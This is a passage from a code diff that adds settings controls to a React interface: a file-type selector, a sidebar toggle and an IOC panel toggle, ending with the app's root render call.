+        <TweakSection label="Language">
+          <TweakRadio id="lang" label="File type" value={lang}
+            options={[
+              {value:'js',  label:'JS'},
+              {value:'py',  label:'Python'},
+            ]}
+            onChange={v=>setTweak('lang',v)} />
+        </TweakSection>
+        <TweakSection label="Layout">
+          <TweakToggle id="sidebarCollapsed" label="Collapse sidebar"
+            value={sidebarCollapsed} onChange={v=>setTweak('sidebarCollapsed',v)} />
+          {view==='results' && (
+            <TweakToggle id="iocOpen" label="IOC panel"
+              value={iocOpen} onChange={v=>setTweak('iocOpen',v)} />
+          )}
+        </TweakSection>
+      </TweaksPanel>
+    </div>
+  );
+}
+
+ReactDOM.createRoot(document.getElementById('root')).render(<App />);
